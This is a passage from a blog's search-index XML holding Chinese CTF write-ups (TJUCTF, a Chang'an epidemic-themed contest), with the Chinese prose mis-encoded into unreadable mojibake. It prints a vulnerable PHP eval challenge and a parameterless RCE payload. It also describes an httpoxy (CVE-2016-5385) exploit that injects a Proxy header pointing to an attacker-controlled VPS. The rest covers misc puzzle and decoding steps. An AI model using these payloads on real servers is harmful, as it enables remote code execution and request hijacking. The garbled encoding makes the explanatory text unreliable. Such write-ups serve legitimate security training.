class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬,<img src="/images/tjuctf/12.png" alt="image-20220125195719749"><br>æ‰“ä¸€ä¸‹å°±å¯ä»¥äº†,è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹urlç¼–ç ä¸€ä¸‹</p><h5 id="RCE-fun"><a href="#RCE-fun" class="headerlink" title="RCE_fun"></a>RCE_fun</h5><p>emmm  ä¸ä¼šï¼Œåæ¥çœ‹äº†ä¸‹wpï¼Œemmmè¿˜å¯ä»¥è¿™æ ·  ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œåé¢ç ”ç©¶ä¸€ä¸‹</p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h5 id="modulus"><a href="#modulus" class="headerlink" title="modulus"></a>modulus</h5><p>ç»™äº†ä¸€ä¸ªå¤§nï¼Œe1å’Œe2ï¼Œc1ï¼Œc2ï¼Œå…±æ¨¡æ”»å‡»ç›´æ¥ä¸€æŠŠæ¢­<br><img src="/images/tjuctf/13.png" alt="image-20220125200608676"></p><h4 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h4><p>emmmm ä¸èƒ½ç®—åšå‡ºæ¥å§ï¼Œç›´æ¥è½¯ä»¶ä¸€æŠŠæ¢­çš„ï¼Œ<br><img src="/images/tjuctf/14.png" alt=" "></p><p><img src="/images/tjuctf/15.png" alt="image-20220125193800648"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>å¤ªèœäº†ï¼Œcscmsæ²¡åšå‡ºæ¥ï¼Œä¸­é—´æœäº†ä¸€ä¸ªä¸Šä¼ æ¼æ´çœ‰ä¹Ÿæ²¡æœ‰æ‰“é€šï¼Œå°±æ²¡ç®¡äº†ã€‚<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›</title>
      <link href="/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; </code>è¿™é‡Œæ­£åˆ™åŒ¹é…äº†è¾“å…¥çš„codeå­—ç¬¦ï¼Œæœ‰å‚æ•°å°±ä¼šæ›¿æ¢ä¸ºç©ºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥<code>?code=phpinfo();</code>å°±ä¼šæ˜¾ç¤ºphpinfoä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœ<code>system(&#39;ls&#39;);</code>è¿™æ ·å°±ä¼šè¢«è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ‹¬å·é‡Œä¸èƒ½æœ‰å‚æ•°ï¼Œå¯ä»¥è¿™æ ·<code>a(b())</code>,ä½†æ˜¯ä¸èƒ½è¿™æ ·<code>a(&#39;b&#39;)</code>ï¼Œå°±æ˜¯æ— å‚æ•°rceã€‚<br>è¿™è¾¹æˆ‘çœ‹åˆ°é¢˜<code>if(!preg_match(&#39;/session|end|next|header|dir/i&#39;,$_GET[&#39;code&#39;]))&#123;</code><br>å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ­£å¸¸æˆ‘ä»¬æœ‰ä¸¤ç§é€‰æ‹©ä¸€ç§rceï¼Œä¸€ç§æ–‡ä»¶è¯»å–ï¼Œ<br>é¢˜ç›®ä¹Ÿç»™æˆ‘ä»¬äº† æç¤ºrceï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†endï¼Œheaderï¼Œsessionï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>get_defined_vars ()</code>å‡½æ•°<br>get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„<br><img src="/images/changanzhanyi/1.png" alt="1"><br>getä¼ å‚åæ•°ç»„é‡Œå°±ä¼šæœ‰getä¼ é€’çš„å€¼</p><p>current : è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œæ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒâ€œå½“å‰çš„â€å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒã€‚</p><p>å’Œcurrentç±»ä¼¼çš„å‡½æ•°<br>end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>a=eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br>æ„é€ payload<br>è¿™é‡Œè¿‡æ»¤äº†end  æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨resetä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ <br>æŠŠä¼ é€’çš„å‚æ•°å†™å‰é¢ï¼Œè¿™æ ·<code>a=phpinfo();&amp;code=eval(reset(current(get_defined_vars())))</code><br>éšä¾¿ä¼ ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¦æ”¾åœ¨æœ€å‰é¢è¿™æ ·çš„è¯å°±å¯ä»¥è¿›è¡Œrceäº†<br><img src="/images/changanzhanyi/2.png" alt="image-20220118141207013"></p><h5 id="flagé…é€ä¸­å¿ƒ"><a href="#flagé…é€ä¸­å¿ƒ" class="headerlink" title="flagé…é€ä¸­å¿ƒ"></a>flagé…é€ä¸­å¿ƒ</h5><p>emmmmå¤ªèœäº†  ä¸ä¼šï¼Œå³é”®æºä»£ç æœ‰æç¤ºï¼Œ<!--Powered by PHP 5.6.23 + fastcgi--><br>å¤ç°ä¸€ä¸‹ï¼Œ<code>CVE-2016-5385 </code><br>æŠ“åŒ…ï¼ŒåŒ…é‡ŒåŠ ä¸Š<code>Proxy: http://xxx.xxx.xxx.xxx:xxxx/</code><br>å°±å¯ä»¥äº†ï¼Œvpsç›‘å¬ä¸€ä¸‹ï¼Œè¯¦ç»†ï¼Œç™¾åº¦ cve-2016-5385<br><img src="/images/changanzhanyi/31.png" alt="image-20220120164323864"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="è¥¿å®‰åŠ æ²¹"><a href="#è¥¿å®‰åŠ æ²¹" class="headerlink" title="è¥¿å®‰åŠ æ²¹"></a>è¥¿å®‰åŠ æ²¹</h5><p>æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œæ”¾åˆ°networkæµé‡çœ‹åˆ°æœ‰ä¸€ä¸ªsecret.txtå’Œhint.txtçš„æµé‡åŒ…ä¸ä¸€æ ·å¤§ï¼Œç›´æ¥å³é”®æå‡ºæ¥ï¼Œ<br><img src="/images/changanzhanyi/3.png" alt="image-20220118151527186"><br><img src="/images/changanzhanyi/4.png" alt="image-20220118151613193"><br><img src="/images/changanzhanyi/5.png" alt="image-20220118152247852"><br>æ˜¾ç„¶è¿™é‡Œbase64è½¬ä¸€ä¸‹secretå†…å®¹pkå¼€å¤´æ˜¯ä¸€ä¸ªzipåŒ…ï¼Œæˆ‘ä»¬ä¿å­˜ä¸‹æ¥ï¼Œæ”¹ä¸€ä¸‹åç¼€ï¼Œè§£å‹ä¸€ä¸‹é‡Œé¢æ˜¯å¾ˆå¤šå›¾ç‰‡ï¼Œæ‹¼å›¾ï¼Œå†çœ‹ä¸€ä¸‹hint.txt,<br><img src="/images/changanzhanyi/6.png" alt="image-20220118152825786"><br>base32çš„æç¤ºï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«çš„æ‹¼å›¾äº†ã€‚<br>æ‰‹å·¥æ‹¼å›¾å¾ˆç´¯ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨å·¥å…·<br><img src="/images/changanzhanyi/7.png" alt="image-20220118154452731"><br><img src="/images/changanzhanyi/8.png" alt="image-20220118154522615"><br>å…ˆçœ‹ä¸‹ä¿¡æ¯ï¼Œæ¯ä¸ªå°å›¾ç‰‡éƒ½æ˜¯100*100çš„æ€»å…±49ä¸ªé¡¹ç›®ï¼Œå»æ‰dsstore è¿˜å‰©48ä¸ªï¼Œå¯èƒ½æ˜¯6x8çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯4x12ï¼Œè¿™é‡Œç”¨4x12çš„ æŠŠæ‰€æœ‰çš„å°å›¾ç‰‡ç”¨<code>montage</code>æ‹¼æˆä¸€ä¸ªå¤§å›¾ç‰‡ï¼Œç„¶åç”¨<code>gaps</code>è¿›è¡Œè¿˜åŸ<br><code>montage *png -tile 12x4 -geometry 100x100+0+0 out.png</code><br>-tileæ˜¯æ‹¼æ¥æ—¶æ¯è¡Œå’Œæ¯åˆ—çš„å›¾ç‰‡æ•°ã€‚è¿™é‡Œç”¨12x4ï¼Œå°±æ˜¯12åˆ—4è¡Œï¼Œä¹Ÿå°±æ˜¯é•¿12å¼ å›¾ç‰‡é«˜4å¼ <br>-geometryæ˜¯æ¯ä¸ªå°å›¾ç‰‡çš„åƒç´ ï¼Œåé¢çš„+0+0æ˜¯è¾¹æ¡†æ˜¯0ï¼Œ<br><img src="/images/changanzhanyi/9.png" alt="image-20220118160159420"><br>æ‹¼æˆä¸€ä¸ªå¤§å›¾ç‰‡åï¼Œç›´æ¥ç”¨gaps,æˆ‘ä»¬ä¸èƒ½ç¡®å®šgenerationsï¼Œå¯ä»¥åŠ ä¸ªversionï¼Œå®ƒå¯ä»¥ä¸€ä¸ªä¸ªæ˜¾ç¤ºï¼Œå¤šè¿è¡Œå‡ éï¼Œä¸­é—´çœ‹é‚£ä¸ªæ¸…æ¥šï¼Œæˆªå›¾å°±å¯ä»¥äº†<br><code>gaps --image=out1.png --generations=100 --population=48 --size=100 --verbose</code><br>â€“image            æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„<br>â€“size            æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸<br>â€“generations    é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡<br>â€“population    ä¸ªä½“æ•°é‡<br>â€“verbose        æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ<br>â€“save            å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ<br><img src="/images/changanzhanyi/10.png" alt="image-20220118161022716"></p><h5 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h5><p>ä¸‹è½½é™„ä»¶åï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶fileä¸€ä¸‹<br><img src="/images/changanzhanyi/11.png" alt="image-20220118171304054"><br>æ˜¯ä¸€ä¸ªclassæ–‡ä»¶ï¼Œæœæ–­æ”¹æˆ.classåæ‹–åˆ°jd-guié‡Œï¼Œçœ‹èµ·æ¥åƒæ˜¯ascciiï¼Œå¾ˆé•¿ï¼Œè„šæœ¬<br><img src="/images/changanzhanyi/12.png" alt="image-20220118171417093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(chr(int(i)),end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuM